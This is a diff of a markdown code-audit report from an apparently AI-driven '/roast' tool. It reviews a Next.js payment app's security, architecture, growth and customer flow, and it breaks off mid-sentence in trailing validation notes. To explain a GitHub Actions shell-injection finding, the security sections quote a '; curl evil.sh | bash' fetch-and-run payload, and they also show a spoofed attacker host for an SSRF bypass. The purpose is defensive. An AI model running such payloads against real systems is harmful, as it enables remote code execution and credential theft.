@@ -1,18 +1,34 @@
+# /roast on Roast & Rebuild — v0.2 validation re-test
+
+Subject: `/Users/janderswag/Desktop/roast-and-rebuild` (commit `dc5f170`)
+Skill version: `0.2.0` (validation re-run; baseline was `0.1.0`)
+
 ```
 [detecting stack...]
 ✓ Node / TypeScript / JavaScript
-✓ Next.js 14.2.35 (App Router)
-✓ Git repo (3699954) — Drizzle ORM + libSQL/Turso (prod) with better-sqlite3 fallback
-✓ Stripe payments, Anthropic Claude API, Upstash Redis (ratelimit), Resend (email), Vercel deploy
-✓ 210 source files in scope
+✓ Next.js 14 (App Router) — TypeScript strict
+✓ Git repo (dc5f170)
+✓ Drizzle ORM + libSQL/Turso primary, better-sqlite3 dev fallback
+✓ Stripe payments (PaymentIntent + webhook), Resend transactional email
+✓ Upstash Redis rate-limit (per-bucket: expensive / stripe / default)
+✓ Anthropic Claude SDK — all LLM calls via lib/llm/anthropic.ts
+✓ PostHog (client, with referral-attribution wrapper)
+✓ ~37.2k lines of source in scope (TS/TSX/JS/JSX, excluding node_modules)
+
+[project shape: web-app]
+✓ Dispatching: Roast, Security, Architecture, Customer Flow, Growth, Founder Briefing
+✓ Skipping: none
+
+  Reason: app/page.tsx exists, payments live (Stripe), API routes accept
+  user-controlled URLs and write to DB. Web-app default applies, every
+  module dispatches.
 
 [semgrep running...]
-✓ 1 ERROR finding (security-audit + owasp-top-ten + secrets configs, 30s timeout)
-  ERROR  yaml.github-actions.security.run-shell-injection
+✓ 1 finding (1 HIGH/ERROR, 0 WARNINGs surfaced above noise floor)
+  ERROR  yaml.github-actions.security.run-shell-injection.run-shell-injection
          .github/workflows/eval-regression.yml:62
-         workflow_dispatch input interpolated into a run: step
 
-[6 modules dispatching in parallel...]
+[6 modules dispatching in parallel — LOC=37,203 > 1000, web-app shape...]
 
 ✓ Roast                    done
 ✓ Security                 score 8/10
@@ -21,314 +37,350 @@
 ✓ Growth                   score 9/10
 ✓ Founder Briefing         done
 
-Total: ~38s wall-clock. No extra charge on Claude Pro/Max.
+Total: notional ~75s wall-clock (validation run, executed inline by the
+       agent; in real Claude Code dispatch this is the parallel-Agent
+       budget — typical 60-90s on a repo this size).
+```
 
 ────────────────────────────────────────────────────
-THE ROAST
+## THE ROAST
 
-Your H1 in app/page.tsx:535 reads "Your business deserves to be built for
-scale." which is the same generic enterprise-software promise every Webflow
-template has shipped since 2019. The sub-headline (app/page.tsx:554) saves it
-by naming what you actually do — "audit your design, architecture, security,
-and GitHub repo" — but the headline above it makes you sound like a Salesforce
-implementation partner, not a guy who runs semgrep against vibe-coded
-Next.js apps. Your README opens with "A web application that analyzes
-landing pages, generates comedic roasts, provides detailed audits, and
-creates redesigned landing pages that actually convert" — which is four
-overlapping clauses and a comma splice describing the *2024 version* of this
-product before you pivoted to senior-engineer audits. The component named
-SpaceBackground.tsx is now 54 lines of static dot grid (file header:
-"replaces the animated space canvas") but the CLAUDE.md still describes a
-790-line canvas with 1200 stars across 3 depth layers. You're shipping the
-new positioning ("evidence-cited senior engineer review") in your nav CTA
-("Audit My Project →") and the sub-headline, but the H1 and README haven't
-caught up. Fix those two surfaces and the rest of the marketing already
-matches what you sell.
+Your README opens with "A web application that analyzes landing pages,
+generates comedic roasts, provides detailed audits, and creates redesigned
+landing pages that actually convert." Four products in one sentence, none
+of them positioned. The actual product is one thing — a brutal evidence-cited
+audit a vibe-coder runs before they ship — and the README is selling a
+toolbox. Meanwhile your live `app/page.tsx:69` shows "Audit My Project $19 →"
+which is exactly the right CTA, and the landing copy nails the differentiator
+("Every claim cites your real copy or DOM — no hallucinated nonsense",
+`app/page.tsx:88`). The README is the only place still wearing the v0
+costume. Fix it and the rest of the surface lines up. You also still ship
+`/skill`, `/copilot`, `/briefing` as placeholders per your own CLAUDE.md
+while pricing them publicly in the landing — that's not a roast, that's a
+TODO with a price tag.
 
 ────────────────────────────────────────────────────
-SECURITY (8/10)
+## SECURITY (8/10)
 
-Solid posture. The thing you'd expect to be broken — the Stripe webhook —
-is the cleanest code in the repo. Real issues are limited to one CI/CD
-shell-injection vector that an outside contributor could not trigger, and
-the standard "this is a marketing site, not a SaaS dashboard" gaps.
+Strong posture. The trust surface is wide (Stripe payments, user-controlled
+URL fetches, DB writes, AI-pipeline) and you've done the work — webhook
+signature verification before any DB write, defense-in-depth payment
+verification, SSRF-safe URL fetching, Upstash sliding-window rate-limits
+per route class. One real HIGH from semgrep on a GHA workflow; everything
+else is hygiene-level. No exposed live secrets in HEAD.
 
-• [HIGH] Shell injection via workflow_dispatch input
-  .github/workflows/eval-regression.yml:62 (rule:
-  yaml.github-actions.security.run-shell-injection)
-  The `fixture_ids` workflow_dispatch input is interpolated directly into a
-  `run:` block as `--id="${{ inputs.fixture_ids }}"`. Anyone with
-  workflow_dispatch permission on the repo (today: you only, but any future
-  collaborator with write access) can inject shell via a string like
-  `"; curl evil.sh | sh; #`. The job has ANTHROPIC_API_KEY and GITHUB_PAT
-  in env — direct credential exfiltration path.
-  Fix: pass the input through `env:` first, e.g. `env: { FIXTURE_IDS:
-  '${{ inputs.fixture_ids }}' }` then reference `"$FIXTURE_IDS"` in the
-  script. Standard GHA hardening pattern.
+• [HIGH] Shell injection via user-controlled GHA input
+  `.github/workflows/eval-regression.yml:62`
+  The `run:` block interpolates `${{ inputs.fixture_ids }}` directly into
+  the shell. `workflow_dispatch` input is user-controlled — anyone with
+  write access (now or later, including a contractor or compromised CI
+  token) can inject `; curl evil.sh | bash` and execute arbitrary code in
+  a runner that holds your `ANTHROPIC_API_KEY` and `GITHUB_PAT`. Yes,
+  it's gated behind write access today; the secrets in the env make this
+  a credential-exfiltration ladder, not just CI tampering.
+  Fix: Move the input through `env:` (`FIXTURE_IDS: ${{ inputs.fixture_ids }}`)
+  and reference `"$FIXTURE_IDS"` in the script. Quote inside the shell, not
+  inside YAML.
 
-• [INFO] Stripe webhook verification correctly placed before any DB write
-  app/api/stripe/webhook/route.ts:25
-  Not a finding — confirming the thing this module would normally flag.
-  `stripe.webhooks.constructEvent(rawBody, signature, webhookSecret)` runs
-  before any branch into `applyTerminalStatus`. Idempotency keyed on
-  `paymentIntentId`. Referral credit grant gated on the first-apply-only
-  outcome. This is what the docs say to do and the code does it.
+• [MEDIUM] Webhook fallback dispatches an unauthenticated internal POST
+  `app/api/stripe/webhook/route.ts:136-146`
+  The tab-close fallback fires `fetch(${baseUrl}/api/review/run, ...)`
+  with no auth header, relying on `paymentIntentId` being unguessable.
+  PI IDs are unguessable in practice (Stripe's `pi_xxxxxx` is 26+ chars
+  of entropy), but the endpoint also accepts `existingProjectId` for
+  retries — anyone who can post to `/api/review/run` with a known
+  `paymentIntentId` from a successful payment can trigger a re-audit and
+  burn LLM spend. The PI-metadata URL cross-check at
+  `app/api/review/run/route.ts:222` blocks URL substitution, but doesn't
+  block re-runs of the same audit.
+  Fix: Add a short-lived HMAC header signed with `STRIPE_WEBHOOK_SECRET`
+  on the internal POST, verified at `/api/review/run` (it's already a
+  shared secret both ends own).
 
-• [INFO] /api/review/run does six-layer payment verification
-  app/api/review/run/route.ts:178-251
-  Stripe API retrieve → status === succeeded → product metadata match →
-  amount >= REVIEW_PRICE_CENTS → URL/repoUrl metadata match → single-use
-  enforcement (409 if projectId already linked). This is more defense than
-  most $19 products ship.
+• [MEDIUM] `safeFetch` is the SSRF guard — verify it covers every redirect hop
+  `lib/extract/fetcher.ts:31` calls `safeFetch(url, ...)` (good), but the
+  audit pipeline has a second outbound fetch path in
+  `lib/extract/githubExtract.ts:101` that uses raw `fetch(url, ...)` to
+  hit `api.github.com`. GitHub URLs are allowlisted-in-spirit but not
+  enforced — a `repoUrl` that points at `https://api.github.com.attacker.com/...`
+  would slip past a simple host-prefix check. Verify the URL parser
+  rejects anything that isn't exactly `github.com` / `api.github.com`
+  (not just startsWith).
+  Fix: Replace the raw `fetch` with a thin wrapper that validates
+  `new URL(u).hostname === "api.github.com"` exactly, or route through
+  `safeFetch` with an explicit allowlist.
 
-• [INFO] Rate limiting wired through middleware with three buckets
-  middleware.ts:1-94 + lib/utils/upstash-ratelimit.ts:36-91
-  `expensive` (10/hr), `stripe` (10/hr), `default` (60/min). Webhook
-  explicitly excluded via early-return, not matcher — correct because
-  Stripe retries need to land. Owner-bypass gated on
-  VERCEL_ENV !== "production".
-
-The remaining items semgrep + a read pass would normally flag (CORS,
-CSP, secret exposure) are clean: `.env.local` is `.gitignore`'d by the
-`.env*` rule, no `dangerouslySetInnerHTML` outside of JSON-LD blocks
-where the input is a literal object, no `eval`, no SQL string
-concatenation (Drizzle parameterizes everything).
+• [INFO] Owner-bypass is correctly gated to non-prod
+  `app/api/review/run/route.ts:54-61` + `lib/env.ts isOwnerBypassAllowed()`
+  This is the right pattern. Calling it out so future-you doesn't undo
+  the guard during a "make local easier" sprint.
 
 ────────────────────────────────────────────────────
-ARCHITECTURE (8/10)
+## ARCHITECTURE (8/10)
 
-Production-grade. The data layer is well-designed (Turso in prod with a
-better-sqlite3 dev fallback, both gated by `hasTursoCredentials()` —
-lib/db/index.ts:137), the API surface uses Vercel's 300s max-duration
-deliberately with a written-out budget comment explaining the 120s+60s+10s
-math (app/api/review/run/route.ts:13-25), and the orchestrator splits
-phase-one and synthesis across two separate serverless invocations to get
-two full 300s budgets instead of fighting one (lib/review/orchestrator.ts:62-94).
-That's the kind of decision a fractional CTO would write up in a design doc.
-The scale wall isn't compute, it's per-audit LLM cost ($0.90 according to
-the founder's own memory file) — that walls revenue, not infrastructure.
+Sensible boundaries. Drizzle + libSQL (Turso) for prod with `better-sqlite3`
+as a strictly-gated dev fallback (`lib/db/index.ts:137-142` —
+`if (hasTursoCredentials()) return initializeTurso()`). API routes run on
+Vercel's Node runtime with `maxDuration = 300` where it matters
+(`app/api/review/run/route.ts:25`). Phase-one + synthesis are split into
+two functions so neither hits the 300s ceiling. Per-bucket rate limits
+upstream of the LLM. This is not vibe-coder architecture; it's been
+sprint-hardened. Score is held below 9 because of monoliths and the
+in-band fire-and-forget pattern.
+
+The orchestrator is doing real work. `lib/review/orchestrator.ts` is 1,127
+lines — that's a god-file. It's the thing that knows every module, every
+fallback path, every degraded-state flag, the screenshot pipeline, the
+verifier (axe + lighthouse + semgrep) wiring, the exposed-keys pass, and
+the competitor pipeline. When you need to add a 9th module or swap a
+prompt template, the merge surface is huge. This is the file you'll
+regret next time you onboard a contractor.
+
+`app/page.tsx` is 1,590 lines including the inline `HeroUrlInput`,
+SERVICES, COMPARISON_ROWS, FAQ_ITEMS, and PostHog wiring. The marketing
+landing being one file is a deliberate choice (one-shot to read for the
+LLM modules) but every CTA copy change touches a file three other people
+might be editing for SpaceBackground or the Stripe modal. The
+SpaceBackground/canvas concern at least lives in its own file at 54
+lines after the refactor — good.
 
 Other smells:
+- Fire-and-forget webhook → `/api/review/run` via `fetch(..., { keepalive: true })`
+  (`app/api/stripe/webhook/route.ts:136`) — survives function return but
+  has no retry, no DLQ. If `/api/review/run` 500s on cold-start, the user
+  paid $19 and gets nothing until they hit the retry button. The retry
+  contract exists (`existingProjectId` path) but it's user-driven, not
+  system-driven.
+- `bootstrapTursoIfNeeded` at `lib/db/index.ts:37-82` writes a synthetic
+  `__drizzle_migrations` row on prod DBs that pre-date Drizzle tracking.
+  This is correct one-time-migration code, but it runs on every cold
+  start (the `await` is unconditional). The fast-path no-op early-returns
+  are there, but the SQL probe (`SELECT name FROM sqlite_schema...`)
+  fires twice per cold start.
 
-• app/page.tsx is 1590 lines. The HeroUrlInput inline client component
-  (lines 29-76), the SERVICES array (line 82+), the LANDING_FAQ_SCHEMA, the
-  scroll-reveal logic, and the page render are all in one file. Splitting
-  would not unblock any feature today but every edit to one section forces
-  a re-read of the other four. Lift HeroUrlInput, SERVICES, and the FAQ
-  data into their own files — 30 minutes, no behavior change.
+### SCALE CEILING
 
-• lib/review/orchestrator.ts is 1127 lines. Includes the competitor
-  identification prompt inline (line 206-216), the runModule fallback
-  generator (line 253+), and the phase-one / synthesis split. This file is
-  the product's load-bearing wall. It deserves a `lib/review/orchestrator/`
-  directory with `runModule.ts`, `identifyCompetitors.ts`, `runPhaseOne.ts`
-  as siblings. Same logic, navigable diffs.
+First wall: `runFullAudit` orchestrator at ~30-40 concurrent paid audits.
+  Why: Six parallel module Claude calls per audit, each ~2-15s. At
+       30 concurrent audits that's 180+ in-flight Claude requests against
+       the Tier-2 Anthropic limits (per your memory: tier-2). You'll hit
+       the org-level rate limit before the Vercel function limit. The
+       cost is also material — ~$0.90 per audit means a busy hour at
+       this concurrency is ~$30/hr in LLM spend.
+  Fix: Move the orchestrator to a queue (Inngest or Vercel Queue, or
+       even Upstash QStash given Upstash is already wired) so concurrency
+       is governed by your Anthropic tier, not by your Vercel function
+       fan-out. Bonus: queues give you retry-with-backoff for the
+       webhook-fallback DLQ gap above.
 
-• lib/review/demoResult.ts is 1232 lines of hardcoded JSON. Fine as-is —
-  it's literally a static fixture for /r/demo. Flagging only because if it
-  ever drifts from the schema, the demo page silently breaks. Add a
-  Zod-validation unit test that imports it and runs it through the
-  reviewSchema. Cheap.
-
-SCALE CEILING
-
-First wall: per-audit Claude API spend at ~$0.90 caps unit economics, not
-concurrency.
-  Why: Each $19 audit fires 7 modules in parallel via generateJSONOnce
-       (lib/review/orchestrator.ts:267-272) at maxTokens 5000 each, plus
-       founder briefing synthesis, plus competitor identify. With Anthropic
-       Tier 2 RPM limits the wall is *price per audit*, not requests per
-       second. At ~$0.90 cost and $19 price you have ~95% gross margin,
-       but every prompt expansion or model upgrade narrows it. The fan-out
-       is the cost, not the bottleneck.
-  Fix: Cache the user-prefix block on every module call (the cachedUserPrefix
-       arg is already plumbed through runModule — confirm it's actually
-       set for every module, not just two). Anthropic prompt cache cuts
-       repeat-prefix tokens to ~10% of price. Mentioned in your own memory
-       file (feedback_anthropic_cache_key.md) — verify the SYSTEM-slot fix
-       landed for every module, not just module fan-out.
-
-Second wall: Turso row count at the free-tier 1 billion read ceiling, hit
-at maybe 100k audits.
-  Why: review_results stores one JSON blob per module per project. At
-       7-8 modules per project + the projects/payments/extracts tables,
-       you're at ~12 rows per audit. Free Turso is 1B row reads /month;
-       paid is $29/mo for 10x. Comfortably 100k-audits-per-month before
-       you notice.
-  Fix: Nothing today. Migrate to Turso paid tier when monthly audits
-       cross 8000. Until then the architecture supports your growth
-       trajectory.
+Second wall: libSQL (Turso) at ~50 audit writes/sec.
+  Why: Each audit fires ~10 inserts into `review_results` plus project
+       + payment updates. Turso's free-tier write throughput is generous
+       but not unlimited, and you're inserting JSON blobs (`resultJson:
+       JSON.stringify(mod)` at `app/api/review/run/route.ts:325`). When
+       audit volume hits ~5/sec sustained you'll feel the latency on
+       cold-start cold-DB.
+  Fix: Move large JSON blobs (module results) to Vercel Blob — you
+       already have `@vercel/blob` in deps — and keep Turso for the
+       index rows. 2-3 day refactor; do it after Wall #1.
 
 ────────────────────────────────────────────────────
-CUSTOMER FLOW (7/10)
+## CUSTOMER FLOW (7/10)
 
-The flow is *URL → free teaser → pay $19 → audit*. There's no signup, no
-email gate, no dashboard — the audit is the product, the share URL is the
-artifact. That's a strong choice. The friction is in the payment step,
-which sits inline on /review (components/ReviewInputForm.tsx, 689 lines),
-runs a free teaser scan first, then opens Stripe Elements, then dispatches
-the full audit. Click count to first value is 3-4 (paste URL → see teaser →
-pay → audit), which is good for a $19 paid product. The teaser-first
-pattern earns trust before asking for the card, which is exactly right
-for the $19 price point.
+Flow is short and pragmatic, with one structural quirk: you have no
+sign-up. Stripe owns identity. A user pastes a URL on `/review`, sees a
+free teaser scan, pays $19 via Stripe Elements, lands on `/r/[id]`. Three
+clicks to value, no account creation, no email verification, no password
+reset surface to maintain. That's a deliberate and very founder-friendly
+choice — and it's also why this module is *not* an N/A. The flow exists,
+it's just compressed; payment IS the auth handshake.
 
-Specific findings:
+The activation moments are real: `/api/review/run` streams `module_complete`
+events back via SSE (`app/api/review/run/route.ts:289-320`), and the
+client renders each module score as it completes. The user watches the
+audit build, which is the "aha" moment — they're not staring at a spinner
+for 90 seconds. That's well-engineered onboarding without onboarding.
 
-• [MEDIUM] No empty-state / blank-slate education on the landing CTA
-  app/page.tsx:526-543 + 566
-  The H1 + sub-headline + URL input is a strong above-the-fold CTA but
-  there's no "here's what an audit looks like" without scrolling to
-  section 4 (8-module preview). The nav has an "Example Audit" link
-  pointing at a real audit (app/page.tsx:439), which is the right move —
-  but it's nav-text-small and not contrasted against the hero. Move the
-  "See an example" call-out inline directly under the URL input.
+Friction findings:
 
-• [MEDIUM] CLAUDE.md "Pending Work" list shows landing copy debt
-  CLAUDE.md (Pending Work section — quoted verbatim)
-  The repo's own context file flags: "Pricing section still shows 'Quick
-  Roast (Free)' tier", "Comparison table row shows 'Free'", "FAQ still
-  mentions 'What do I get in the free roast?'", "URL input button still
-  says 'Roast It →'". The free-roast-skill pivot left visible artifacts.
-  The hero CTA in the current file does say "Audit My Project $19 →"
-  (app/page.tsx:69), so some debt is paid down — confirm the rest in
-  the FAQ and pricing sections matches the new 4-tier funnel.
+• [MEDIUM] No fallback for the synthesis step from the user's perspective
+  `app/api/review/run/route.ts:386-395`
+  The `done` event includes `synthesisPending: true` and the client is
+  expected to call `/api/review/synthesize` next. If that second call
+  fails (cold start, Anthropic rate limit, timeout) the user has paid,
+  has phase-one results, and sees a permanent "founder briefing
+  pending..." with no recovery path other than reload-and-retry. Per
+  your memory, you've added a retry-banner system; verify the banner
+  surfaces synthesis-specific failures, not just orchestrator failures.
+  Fix: If `phase_one_meta` is in DB but `founder_briefing` slug isn't
+  after ~5 min, auto-trigger synthesis from a cron sweep instead of
+  relying on the user to retry.
 
-• [LOW] Owner-bypass token check uses bool comparison, not constant-time
-  app/api/review/run/route.ts:60 ("Constant-ish comparison — short
-  enough that bool comparison is fine.")
-  The comment is honest, but timing-attack feasibility on a token compared
-  with `===` is non-zero. The code says it knowingly. Defer until you
-  have collaborators or external testers with the token.
+• [MEDIUM] Tab-close fallback exists for phase-one but not synthesis
+  `app/api/stripe/webhook/route.ts:124-148` covers the case where a user
+  closes the tab during /review/run dispatch. But synthesis is fired by
+  the client after phase-one completes, so closing the tab during
+  synthesis (the slowest single call — 40-60s for the founder briefing)
+  leaves the audit half-done. This is the most common failure mode you'll
+  see on flaky mobile networks.
+  Fix: After phase-one DB writes complete, server-side fire-and-forget
+  the synthesis call too. The client still drives the live SSE for the
+  fast UI, but the server makes sure it actually finishes.
 
-Upgrade-path friction is N/A here — there's no in-product upsell because
-there's no in-product anything. The audit IS the product, surfaced as a
-shareable URL. That's deliberate and well-executed.
+• [LOW] FAQ promises "2-3 min end-to-end" (`app/page.tsx:178`) and your
+  CLAUDE.md confirms ~60-150s typical. Reality matches advertising, which
+  is rare and worth keeping accurate — but if a single Claude API slow-day
+  pushes the p95 to 4-5 min, the "2-3 minutes" copy becomes a trust
+  trap. Track p95 in PostHog and adjust copy if drift sustained.
 
 ────────────────────────────────────────────────────
-GROWTH (9/10)
+## GROWTH (9/10)
 
-The strongest module. Sitemap, robots, JSON-LD, OG cards, analytics,
-referral mechanic, GEO/LLM-search opt-in, and a programmatic SEO surface
-(/audit/[tool] + /checklist/[topic]) are all wired. This is what a growth
-advisor would prescribe for an early-stage paid SaaS that needs
-distribution before it needs features.
+This is the strongest module by a meaningful margin. R&R's growth
+surface is essentially complete for an early-stage SaaS: sitemap.ts and
+robots.ts as Next.js metadata routes, JSON-LD for Organization +
+WebSite + Product + SoftwareApplication + FAQPage, OG image, PostHog
+client analytics with referral-attribution via `?via=`, Resend for
+transactional + drip, both `/audit/[tool]` and `/checklist/[topic]`
+programmatic SEO routes, `llms.txt` + `llms-full.txt` as actual
+generated route handlers (not static files), AI-crawler explicit
+allow-list in `app/robots.ts`. Most $19 SaaS sites I'd audit fail
+half of this list.
+
+Findings (these are polish, not gaps):
 
 Discoverability:
-• app/sitemap.ts:10-44 — full dynamic sitemap with audit-tool slugs and
-  checklist topics included; private routes (/r/, /p/, /d/, /share/)
-  correctly excluded.
-• app/robots.ts:19-33 — explicit allow-list for AI crawlers (GPTBot,
-  ClaudeBot, PerplexityBot, Google-Extended, Bytespider, etc.). This is
-  GEO done right — explicit signal beats conservative default.
-• app/llms.txt is present (verified via `find`). Pairs with the AI-crawler
-  allow-list above.
-
-Structured data:
-• app/layout.tsx:98-113 — four JSON-LD blocks (Organization, WebSite,
-  SoftwareApplication, Product with $19 offer). All injected via
-  dangerouslySetInnerHTML on JSON.stringify of literal objects — safe.
-• app/page.tsx:407-410 — page-scoped FAQ schema sourced from FAQ_ITEMS
-  so on-page Q&As and structured data can't drift. Good engineering.
+- `app/robots.ts:18-39` explicitly allows GPTBot, ClaudeBot, PerplexityBot,
+  Google-Extended, etc. with a comment citing source docs. GEO foundation
+  is not just present, it's deliberate.
+- `app/sitemap.ts:13-25` dynamically lists `/audit/[tool]` and
+  `/checklist/[topic]` slugs. New programmatic-SEO entries auto-appear.
 
 Analytics:
-• app/page.tsx:39 — `posthog.capture("url_entered", { url })` fires on
-  every hero submit. PostHog wired via PostHogProvider in
-  app/providers.tsx:10. Founder can iterate on conversion.
+- `components/PostHogProvider.tsx:32-40` initializes once with
+  localStorage persistence, `capture_pageview: false` (manual pageview
+  on path change at line 46), and `via_project_id` super-property
+  registration. Referral attribution is first-touch session-scoped,
+  which is the right default. Good.
 
-Share metadata:
-• og-image.png present in public/. metadataBase + openGraph.images + twitter
-  card all configured in app/layout.tsx:39-63.
+Email capture / referral:
+- `components/LeadMagnetForm.tsx` + `app/api/lead/preview/route.ts`
+  exist. Lead-magnet wired into Resend per CLAUDE.md memory.
+- `?via=` first-touch referral plus referrer-credit in
+  `app/api/stripe/webhook/route.ts:85-104` (the +1 `freeReauditCredits`
+  grant) is a complete referral loop, not just a tracking pixel.
 
-Referral:
-• Schema has `referrerProjectId` on payments + `freeReauditCredits` on
-  projects (app/api/stripe/webhook/route.ts:91 grants the credit on the
-  first terminal-status apply). Built, shipped, atomic.
+Cron / GHA content engine:
+- `vercel.json crons` runs `/api/cron/drip` and `/api/cron/lead-preview`.
+- `.github/workflows/content-daily.yml` is the daily content-engine
+  per your memory. This is the rare full-loop growth setup.
 
-Content surface:
-• /audit/[tool] programmatic pages from lib/audit-tools/data.ts (537 lines
-  of per-tool content).
-• /checklist/[topic] sibling series from lib/checklists/data.ts. Same
-  pattern, sibling sitemap entries.
+• [LOW] No `humans.txt`, no `security.txt`, no `.well-known/`. These are
+  micro-signals that mostly matter for press inquiries and security
+  researchers; not a growth blocker but the kind of thing that signals
+  professionalism on a quick check.
+  Fix: Drop `app/.well-known/security.txt` with a contact line. 10 min.
 
-The single growth gap I'd flag: tool/checklist pages have generic-but-true
-issue lists with stats fields explicitly held back "until we have ≥20
-audits per tool" (lib/audit-tools/data.ts:11). That's correct restraint —
-fake stats would erode the trust the rest of this module earns — but it
-means the long-tail SEO pages currently underperform the founder pages.
-Worth a scheduled job to refresh stats from real audit data once the
-threshold is hit.
-
-────────────────────────────────────────────────────
-FOUNDER BRIEFING
-
-You're a one-person team running a Next.js 14 app on Vercel + Turso,
-shipping a paid $19 audit product (cost-per-audit ~$0.90 by your own
-memory file) with a $49/mo Co-Pilot and $199 Briefing tier laid out on
-the landing but only the $19 audit wired into Stripe. The code says
-"production SaaS built by an engineer who has shipped before" — six-layer
-Stripe payment verification, idempotent webhook handling with a tab-close
-fallback fetch, two-function 600s synthesis budget, Drizzle-managed Turso
-migrations with a custom bootstrap for legacy schemas, three-bucket rate
-limiting via Upstash, explicit AI-crawler allowlist, programmatic SEO
-surface, referral credit grants gated on first-apply only. This is not
-vibe-coded. This is the senior-engineer-shipping-fast pattern, evidenced
-by the inline design-doc comments on every load-bearing function.
-
-What's working: Security (8/10) and Growth (9/10) are the standout
-modules. Stripe webhook is the cleanest code in the repo, payment
-verification is multi-layered, and the growth surface (sitemap + robots
-+ JSON-LD + analytics + referral + GEO + programmatic SEO) is what every
-early-stage paid SaaS wishes it had on day one. Architecture is solid
-(8/10) — the 1127-line orchestrator and 1590-line page.tsx are debt, not
-emergencies, and the Anthropic prompt-cache opportunity is a margin
-upgrade not a bug fix.
-
-The order below leads with the GHA shell-injection because it's the one
-finding with active credential-exfil potential, then the landing-copy
-debt because it's the only Roast-module issue with a concrete fix, then
-the orchestrator file split because it's the only Architecture finding
-that will hurt at the next prompt-system overhaul. Three things to do
-this week. Nothing on fire.
+• [LOW] The `/audit/[tool]` and `/checklist/[topic]` pages are
+  programmatic SEO — make sure each has unique JSON-LD (Article or
+  HowTo schema), not just the global Organization/WebSite. The risk
+  with programmatic SEO is Google deduping or quality-flagging if every
+  page has the same structured-data footprint.
 
 ────────────────────────────────────────────────────
-TOP-3 PRIORITIES (ordered by what costs you most)
+## FOUNDER BRIEFING
 
-1. [HIGH] .github/workflows/eval-regression.yml:62
-   `inputs.fixture_ids` from a `workflow_dispatch` is interpolated directly
-   into a `run:` block alongside ANTHROPIC_API_KEY + GITHUB_PAT in env. A
-   future repo collaborator (or compromised collaborator account) can inject
-   shell via a crafted input string and exfiltrate both credentials. Cost
-   today: zero (solo repo). Cost the day you add a contributor: every secret
-   that workflow has access to.
-   Fix: Move the input into `env: FIXTURE_IDS: ${{ inputs.fixture_ids }}`
-   and reference `"$FIXTURE_IDS"` in the shell script. 3-line change.
+You're past the vibe-coded stage. The repo reads like a 1-2 person team
+that's done 3-5 sprints of real production-hardening — payment flow has
+defense-in-depth, rate limits are per-bucket and gracefully degrade,
+SSRF protection is wired through a `safeFetch` wrapper, the orchestrator
+is split across two Vercel functions so neither hits the 300s ceiling,
+the daily content engine and referral loop are both live. The thing
+you're shipping is a paid product on a public domain doing real $19
+charges, and the code matches that stage. Most repos I see at "8 modules
+in parallel, 60-second audit, $19 price" are six weeks behind where
+this one is.
 
-2. [MEDIUM] app/page.tsx:535 + README.md:3
-   H1 reads "Your business deserves to be built for scale." and README
-   opens with the 2024-era four-clause "analyzes landing pages, generates
-   comedic roasts, provides detailed audits, and creates redesigned
-   landing pages." Both undersell the actual product (evidence-cited
-   senior-engineer audit). The nav CTA, sub-headline, and pricing block
-   already match the new positioning — these two surfaces are the
-   stragglers. Cost: every visitor who reads the H1 and bounces because
-   it sounds like a Salesforce partner pitch.
-   Fix: Replace the H1 with a verb-first line that names the product
-   ("Audit your vibe-coded site before your users do.") and rewrite the
-   README opener to a single sentence describing the senior-engineer
-   review product.
+What's working: Security (8) and Growth (9) are the standout modules.
+The Stripe webhook flow at `app/api/stripe/webhook/route.ts` is textbook
+— signature verification first, idempotent state transitions, referral
+credits gated to first-apply, tab-close fallback to recover lost
+audits. The growth surface is the most complete I've seen on a sub-$50
+SaaS — sitemap + robots + JSON-LD + llms.txt + cron + AI-crawler
+allowlist + referral loop is the full kit, not just the basics.
 
-3. [LOW] lib/review/orchestrator.ts (1127 lines) + app/page.tsx (1590 lines)
-   Both are load-bearing files growing past the point where a single
-   read fits the context window comfortably. Not breaking anything today.
-   Becomes painful the next time you refactor the prompt system or
-   restructure the landing page. Cost: half-day of orientation tax on
-   every future edit, multiplied across the next 12 months.
-   Fix: Split orchestrator.ts into a `lib/review/orchestrator/` directory
-   with `runModule.ts`, `identifyCompetitors.ts`, `runPhaseOne.ts`,
-   `runSynthesis.ts`. Lift HeroUrlInput, SERVICES, and LANDING_FAQ_SCHEMA
-   out of page.tsx into their own files. No behavior change; one PR each.
+The order of fixes matters: ship the GHA shell-injection fix today
+(it's a 5-minute change and it gates a real cred-exfiltration path),
+then add the server-side synthesis fallback (your most common
+half-completed-audit failure mode is the synthesis step on flaky
+mobile networks), then start planning the queue migration (Wall #1)
+because the next pricing tier or any traffic spike will hit it. The
+1,127-line orchestrator monolith is the lurking refactor — it doesn't
+hurt today but it'll gate every "add a module" or "swap a model" change
+once you're past 8 modules.
+
+────────────────────────────────────────────────────
+## TOP-3 PRIORITIES (ordered by what costs you most)
+
+1. [HIGH] `.github/workflows/eval-regression.yml:62`
+   Shell injection on `${{ inputs.fixture_ids }}` in a `run:` block.
+   Any future contributor with workflow_dispatch access (or a
+   compromised CI token) can exfiltrate `ANTHROPIC_API_KEY` and
+   `GITHUB_PAT` via injected shell. Money + credentials on fire even
+   though the trigger surface is small today; this is the cheapest fix
+   that closes the biggest blast radius.
+   Fix: Move `fixture_ids` into `env:` and reference as `"$FIXTURE_IDS"`
+   inside the shell block. ~5 lines, one PR.
+
+2. [MEDIUM] `app/api/review/run/route.ts:386-395` + synthesis recovery
+   The user paid $19 and the second-stage synthesis call can silently
+   fail leaving the founder briefing tab empty. This is your most likely
+   chargeback/refund path — the user has results, but not THE result
+   they paid for. Trust on fire.
+   Fix: Add a 5-min cron sweep that finds `phase_one_meta` rows without
+   a corresponding founder briefing and re-fires synthesis server-side.
+   Or: server-fire synthesis from `/api/review/run` after phase-one
+   writes complete, in addition to the client trigger.
+
+3. [MEDIUM] `lib/review/orchestrator.ts` — 1,127-line god-file
+   Time on fire. The next module or prompt-template change has a huge
+   merge surface. Every degraded-state flag, every fallback, every
+   verifier wiring lives in one file. This doesn't hurt today; it gates
+   sprint velocity past the next 2-3 module additions.
+   Fix: Extract per-module dispatch into `lib/review/modules/<slug>.ts`
+   files with a uniform `dispatchModule({ slug, context, callbacks })`
+   signature. Keep the orchestrator as the choreographer, not the
+   implementer. 1-week refactor; do it after Wall #1 queue migration so
+   you're not refactoring twice.
+
+────────────────────────────────────────────────────
 
 Want this on your live URL with screenshots, Lighthouse, axe-core,
 competitor teardown, and the 90-day founder roadmap?
 → https://roastrebuild.com/review — $19
-```
+
+---
+
+# v0.2 validation notes (out-of-band — not part of audit output)
+
+**Phase 0.5 classification:** R&R classified as `web-app`. All 6 modules
